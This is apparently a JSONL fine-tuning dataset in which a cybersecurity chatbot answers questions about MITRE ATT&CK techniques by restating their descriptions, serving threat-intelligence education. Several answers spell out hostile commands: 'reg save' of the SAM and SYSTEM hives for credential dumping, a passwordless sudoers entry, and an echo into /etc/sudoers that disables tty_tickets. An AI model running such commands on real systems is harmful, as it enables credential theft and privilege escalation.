{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Sudo and Sudo Caching' and with the Id: T1548.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Sudo and Sudo Caching' and with the Id: T1548.003 is described as follows: Adversaries may perform sudo caching and/or use the sudoers file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.Within Linux and MacOS systems, sudo (sometimes referred to as \"superuser do\") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The <code>sudo</code> command \"allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.\"(Citation: sudo man page 2018) Since sudo was made for the system administrator, it has some useful configuration features such as a <code>timestamp_timeout</code>, which is the amount of time in minutes between instances of <code>sudo</code> before it will re-prompt for a password. This is because <code>sudo</code> has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at <code>/var/db/sudo</code> with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a <code>tty_tickets</code> variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).The sudoers file, <code>/etc/sudoers</code>, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like <code>user1 ALL=(ALL) NOPASSWD: ALL</code>.(Citation: OSX.Dok Malware) Elevated privileges are required to edit this file though.Adversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example, <code>/var/db/sudo</code>'s timestamp can be monitored to see if it falls within the <code>timestamp_timeout</code> range. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, if <code>tty_tickets</code> is disabled, adversaries can do this from any tty for that user.In the wild, malware has disabled <code>tty_tickets</code> to potentially make scripting easier by issuing <code>echo \\'Defaults !tty_tickets\\' >> /etc/sudoers</code>.(Citation: cybereason osx proton) In order for this change to be reflected, the malware also issued <code>killall Terminal</code>. As of macOS Sierra, the sudoers file has <code>tty_tickets</code> enabled by default.. The systems targeted by this attack pattern are: Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Archive via Custom Method' and with the Id: T1560.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Archive via Custom Method' and with the Id: T1560.003 is described as follows: An adversary may compress or encrypt data that is collected prior to exfiltration using a custom method. Adversaries may choose to use custom archival methods, such as encryption with XOR or stream ciphers implemented with no external library or utility references. Custom implementations of well-known compression algorithms have also been used.(Citation: ESET Sednit Part 2). The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Modify Cloud Compute Infrastructure' and with the Id: T1578 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Modify Cloud Compute Infrastructure' and with the Id: T1578 is described as follows: An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.Permissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence.(Citation: Mandiant M-Trends 2020). The systems targeted by this attack pattern are: IaaS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Network Devices' and with the Id: T1584.008 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Network Devices' and with the Id: T1584.008 is described as follows: Adversaries may compromise third-party network devices that can be used during targeting. Network devices, such as small office/home office (SOHO) routers, may be compromised where the adversary's ultimate goal is not [Initial Access](https://attack.mitre.org/tactics/TA0001) to that environment -- instead leveraging these devices to support additional targeting.Once an adversary has control, compromised network devices can be used to launch additional operations, such as hosting payloads for [Phishing](https://attack.mitre.org/techniques/T1566) campaigns (i.e., [Link Target](https://attack.mitre.org/techniques/T1608/005)) or enabling the required access to execute [Content Injection](https://attack.mitre.org/techniques/T1659) operations. Adversaries may also be able to harvest reusable credentials (i.e., [Valid Accounts](https://attack.mitre.org/techniques/T1078)) from compromised network devices.Adversaries often target Internet-facing edge devices and related network appliances that specifically do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)Compromised network devices may be used to support subsequent [Command and Control](https://attack.mitre.org/tactics/TA0011) activity, such as [Hide Infrastructure](https://attack.mitre.org/techniques/T1665) through an established [Proxy](https://attack.mitre.org/techniques/T1090) and/or [Botnet](https://attack.mitre.org/techniques/T1584/005) network.(Citation: Justice GRU 2024). The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Malvertising' and with the Id: T1583.008 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Malvertising' and with the Id: T1583.008 is described as follows: Adversaries may purchase online advertisements that can be abused to distribute malware to victims. Ads can be purchased to plant as well as favorably position artifacts in specific locations  online, such as prominently placed within search engine results. These ads may make it more difficult for users to distinguish between actual search results and advertisements.(Citation: spamhaus-malvertising) Purchased ads may also target specific audiences using the advertising network\u2019s capabilities, potentially further taking advantage of the trust inherently given to search engines and popular websites. Adversaries may purchase ads and other resources to help distribute artifacts containing malicious code to victims. Purchased ads may attempt to impersonate or spoof well-known brands. For example, these spoofed ads may trick victims into clicking the ad which could then send them to a malicious domain that may be a clone of official websites containing trojanized versions of the advertised software.(Citation: Masquerads-Guardio)(Citation: FBI-search) Adversary\u2019s efforts to create malicious domains and purchase advertisements may also be automated at scale to better resist cleanup efforts.(Citation: sentinelone-malvertising) Malvertising may be used to support [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) and [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), potentially requiring limited interaction from the user if the ad contains code/exploits that infect the target system's web browser.(Citation: BBC-malvertising)Adversaries may also employ several techniques to evade detection by the advertising network. For example, adversaries may dynamically route ad clicks to send automated crawler/policy enforcer traffic to benign sites while validating potential targets then sending victims referred from real ad clicks to malicious pages. This infection vector may therefore remain hidden from the ad network as well as any visitor not reaching the malicious sites with a valid identifier from clicking on the advertisement.(Citation: Masquerads-Guardio) Other tricks, such as intentional typos to avoid brand reputation monitoring, may also be used to evade automated detection.(Citation: spamhaus-malvertising) . The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Permission Groups Discovery' and with the Id: T1069 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Permission Groups Discovery' and with the Id: T1069 is described as follows: Adversaries may attempt to discover group and permission settings. This information can help adversaries determine which user accounts and groups are available, the membership of users in particular groups, and which users and groups have elevated permissions.Adversaries may attempt to discover group permission settings in many different ways. This data may provide the adversary with information about the compromised environment that can be used in follow-on activity and targeting.(Citation: CrowdStrike BloodHound April 2018). The systems targeted by this attack pattern are: Windows, Azure AD, Office 365, SaaS, IaaS, Linux, macOS, Google Workspace, Containers ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Email Collection' and with the Id: T1114 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Email Collection' and with the Id: T1114 is described as follows: Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Adversaries can collect or forward email from mail servers or clients. . The systems targeted by this attack pattern are: Windows, Office 365, Google Workspace, macOS, Linux ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Security Account Manager' and with the Id: T1003.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Security Account Manager' and with the Id: T1003.002 is described as follows: Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the <code>net user</code> command. Enumerating the SAM database requires SYSTEM level access.A number of tools can be used to retrieve the SAM file through in-memory techniques:* pwdumpx.exe* [gsecdump](https://attack.mitre.org/software/S0008)* [Mimikatz](https://attack.mitre.org/software/S0002)* secretsdump.pyAlternatively, the SAM can be extracted from the Registry with Reg:* <code>reg save HKLM\\sam sam</code>* <code>reg save HKLM\\system system</code>Creddump7 can then be used to process the SAM database locally to retrieve hashes.(Citation: GitHub Creddump7)Notes: * RID 500 account is the local, built-in administrator.* RID 501 is the guest account.* User accounts start with a RID of 1,000+.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'WHOIS' and with the Id: T1596.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'WHOIS' and with the Id: T1596.002 is described as follows: Adversaries may search public WHOIS data for information about victims that can be used during targeting. WHOIS data is stored by regional Internet registries (RIR) responsible for allocating and assigning Internet resources such as domain names. Anyone can query WHOIS servers for information about a registered domain, such as assigned IP blocks, contact information, and DNS nameservers.(Citation: WHOIS)Adversaries may search WHOIS data to gather actionable information. Threat actors can use online resources or command-line utilities to pillage through WHOIS data for information about potential victims. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'System Firmware' and with the Id: T1542.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'System Firmware' and with the Id: T1542.001 is described as follows: Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.(Citation: Wikipedia BIOS)(Citation: Wikipedia UEFI)(Citation: About UEFI)System firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.. The systems targeted by this attack pattern are: Windows, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Search Victim-Owned Websites' and with the Id: T1594 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Search Victim-Owned Websites' and with the Id: T1594 is described as follows: Adversaries may search websites owned by the victim for information that can be used during targeting. Victim-owned websites may contain a variety of details, including names of departments/divisions, physical locations, and data about key employees such as names, roles, and contact info (ex: [Email Addresses](https://attack.mitre.org/techniques/T1589/002)). These sites may also have details highlighting business operations and relationships.(Citation: Comparitech Leak)Adversaries may search victim-owned websites to gather actionable information. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199) or [Phishing](https://attack.mitre.org/techniques/T1566)).. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Cloud Groups' and with the Id: T1069.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Cloud Groups' and with the Id: T1069.003 is described as follows: Adversaries may attempt to find cloud groups and permission settings. The knowledge of cloud permission groups can help adversaries determine the particular roles of users and groups within an environment, as well as which users are associated with a particular group.With authenticated access there are several tools that can be used to find permissions groups. The <code>Get-MsolRole</code> PowerShell cmdlet can be used to obtain roles and permissions groups for Exchange and Office 365 accounts (Citation: Microsoft Msolrole)(Citation: GitHub Raindance).Azure CLI (AZ CLI) and the Google Cloud Identity Provider API also provide interfaces to obtain permissions groups. The command <code>az ad user get-member-groups</code> will list groups associated to a user account for Azure while the API endpoint <code>GET https://cloudidentity.googleapis.com/v1/groups</code> lists group resources available to a user for Google.(Citation: Microsoft AZ CLI)(Citation: Black Hills Red Teaming MS AD Azure, 2018)(Citation: Google Cloud Identity API Documentation) In AWS, the commands `ListRolePolicies` and `ListAttachedRolePolicies` allow users to enumerate the policies attached to a role.(Citation: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022)Adversaries may attempt to list ACLs for objects to determine the owner and other accounts with access to the object, for example, via the AWS <code>GetBucketAcl</code> API (Citation: AWS Get Bucket ACL). Using this information an adversary can target accounts with permissions to a given object or leverage accounts they have already compromised to access the object.. The systems targeted by this attack pattern are: Azure AD, Office 365, SaaS, IaaS, Google Workspace ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Services Registry Permissions Weakness' and with the Id: T1574.011 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Services Registry Permissions Weakness' and with the Id: T1574.011 is described as follows: Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  [PowerShell](https://attack.mitre.org/techniques/T1059/001), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through access control lists and user permissions. (Citation: Registry Key Security)(Citation: malware_hides_service)If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).Adversaries may also alter other Registry keys in the service\u2019s Registry tree. For example, the <code>FailureCommand</code> key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: Kansa Service related collectors)(Citation: Tweet Registry Perms Weakness)The <code>Performance</code> key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.(Citation: microsoft_services_registry_tree) If the <code>Performance</code> key is not already present and if an adversary-controlled user has the <code>Create Subkey</code> permission, adversaries may create the <code>Performance</code> key in the service\u2019s Registry tree to point to a malicious DLL.(Citation: insecure_reg_perms)Adversaries may also add the <code>Parameters</code> key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.(Citation: microsoft_services_registry_tree)(Citation: troj_zegost) Additionally, If adversaries launch their malicious services using svchost.exe, the service\u2019s file may be identified using <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\servicename\\Parameters\\ServiceDll</code>.(Citation: malware_hides_service). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'DNS/Passive DNS' and with the Id: T1596.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'DNS/Passive DNS' and with the Id: T1596.001 is described as follows: Adversaries may search DNS data for information about victims that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target\u2019s subdomains, mail servers, and other hosts.Adversaries may search DNS data to gather actionable information. Threat actors can query nameservers for a target organization directly, or search through centralized repositories of logged DNS query responses (known as passive DNS).(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Adversaries may also seek and target DNS misconfigurations/leaks that reveal information about internal networks. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Application Exhaustion Flood' and with the Id: T1499.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Application Exhaustion Flood' and with the Id: T1499.003 is described as follows: Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018). The systems targeted by this attack pattern are: Windows, Azure AD, Office 365, SaaS, IaaS, Linux, macOS, Google Workspace ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Rc.common' and with the Id: T1163 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Rc.common' and with the Id: T1163 is described as follows: During the boot process, macOS executes <code>source /etc/rc.common</code>, which is a shell script containing various utility functions. This file also defines routines for processing command-line arguments and for gathering system settings, and is thus recommended to include in the start of Startup Item Scripts (Citation: Startup Items). In macOS and OS X, this is now a deprecated technique in favor of launch agents and launch daemons, but is currently still used.Adversaries can use the rc.common file as a way to hide code for persistence that will execute on each reboot as the root user (Citation: Methods of Mac Malware Persistence).. The systems targeted by this attack pattern are: macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Compromise Software Dependencies and Development Tools' and with the Id: T1195.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Compromise Software Dependencies and Development Tools' and with the Id: T1195.001 is described as follows: Adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)  Targeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims. . The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Digital Certificates' and with the Id: T1588.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Digital Certificates' and with the Id: T1588.004 is described as follows: Adversaries may buy and/or steal SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner.Adversaries may purchase or steal SSL/TLS certificates to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or even enabling [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) if the certificate is trusted or otherwise added to the root of trust (i.e. [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)). The purchase of digital certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal certificate materials directly from a compromised third-party, including from certificate authorities.(Citation: DiginotarCompromise) Adversaries may register or hijack domains that they will later purchase an SSL/TLS certificate for.Certificate authorities exist that allow adversaries to acquire SSL/TLS certificates, such as domain validation certificates, for free.(Citation: Let's Encrypt FAQ)After obtaining a digital certificate, an adversary may then install that certificate (see [Install Digital Certificate](https://attack.mitre.org/techniques/T1608/003)) on infrastructure under their control.. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'DNS Server' and with the Id: T1583.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'DNS Server' and with the Id: T1583.002 is described as follows: Adversaries may set up their own Domain Name System (DNS) servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: [Application Layer Protocol](https://attack.mitre.org/techniques/T1071)). Instead of hijacking existing DNS servers, adversaries may opt to configure and run their own DNS servers in support of operations.By running their own DNS servers, adversaries can have more control over how they administer server-side DNS C2 traffic ([DNS](https://attack.mitre.org/techniques/T1071/004)). With control over a DNS server, adversaries can configure DNS applications to provide conditional responses to malware and, generally, have more flexibility in the structure of the DNS-based C2 channel.(Citation: Unit42 DNS Mar 2019). The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Disk Wipe' and with the Id: T1561 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Disk Wipe' and with the Id: T1561 is described as follows: Adversaries may wipe or corrupt raw disk data on specific systems or in large numbers in a network to interrupt availability to system and network resources. With direct write access to a disk, adversaries may attempt to overwrite portions of disk data. Adversaries may opt to wipe arbitrary portions of disk data and/or wipe disk structures like the master boot record (MBR). A complete wipe of all disk sectors may be attempted.To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disks may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Novetta Blockbuster Destructive Malware)On network devices, adversaries may wipe configuration files and other data from the device using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `erase`.(Citation: erase_cmd_cisco). The systems targeted by this attack pattern are: Linux, macOS, Windows, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'DNS' and with the Id: T1071.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'DNS' and with the Id: T1071.004 is described as follows: Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. The DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.(Citation: PAN DNS Tunneling)(Citation: Medium DnsTunneling) . The systems targeted by this attack pattern are: Linux, macOS, Windows, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Cloud Instance Metadata API' and with the Id: T1552.005 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Cloud Instance Metadata API' and with the Id: T1552.005 is described as follows: Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.Most cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)If adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)The de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.. The systems targeted by this attack pattern are: IaaS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Securityd Memory' and with the Id: T1555.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Securityd Memory' and with the Id: T1555.002 is described as follows: An adversary with root access may gather credentials by reading `securityd`\u2019s memory. `securityd` is a service/daemon responsible for implementing security protocols such as encryption and authorization.(Citation: Apple Dev SecurityD) A privileged adversary may be able to scan through `securityd`'s memory to find the correct sequence of keys to decrypt the user\u2019s logon keychain. This may provide the adversary with various plaintext passwords, such as those for users, WiFi, mail, browsers, certificates, secure notes, etc.(Citation: OS X Keychain)(Citation: OSX Keydnap malware)In OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple\u2019s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords.(Citation: OS X Keychain)(Citation: External to DA, the OS X Way) Apple\u2019s `securityd` utility takes the user\u2019s logon password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a set of keys and algorithms to encrypt the user\u2019s password, but once the master key is found, an adversary need only iterate over the other values to unlock the final password.(Citation: OS X Keychain). The systems targeted by this attack pattern are: Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Group Policy Discovery' and with the Id: T1615 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Group Policy Discovery' and with the Id: T1615 is described as follows: Adversaries may gather information on Group Policy settings to identify paths for privilege escalation, security measures applied within a domain, and to discover patterns in domain objects that can be manipulated or used to blend in the environment. Group Policy allows for centralized management of user and computer settings in Active Directory (AD). Group policy objects (GPOs) are containers for group policy settings made up of files stored within a predictable network path `\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\`.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016)Adversaries may use commands such as <code>gpresult</code> or various publicly available PowerShell functions, such as <code>Get-DomainGPO</code> and <code>Get-DomainGPOLocalGroup</code>, to gather information on Group Policy settings.(Citation: Microsoft gpresult)(Citation: Github PowerShell Empire) Adversaries may use this information to shape follow-on behaviors, including determining potential attack paths within the target network as well as opportunities to manipulate Group Policy settings (i.e. [Domain or Tenant Policy Modification](https://attack.mitre.org/techniques/T1484)) for their benefit.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Bootkit' and with the Id: T1542.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Bootkit' and with the Id: T1542.003 is described as follows: Adversaries may use bootkits to persist on systems. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.A bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). (Citation: Mandiant M Trends 2016) The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. (Citation: Lau 2011)The MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.. The systems targeted by this attack pattern are: Linux, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Data from Removable Media' and with the Id: T1025 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Data from Removable Media' and with the Id: T1025 is described as follows: Adversaries may search connected removable media on computers they have compromised to find files of interest. Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration. Interactive command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information. Some adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on removable media.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
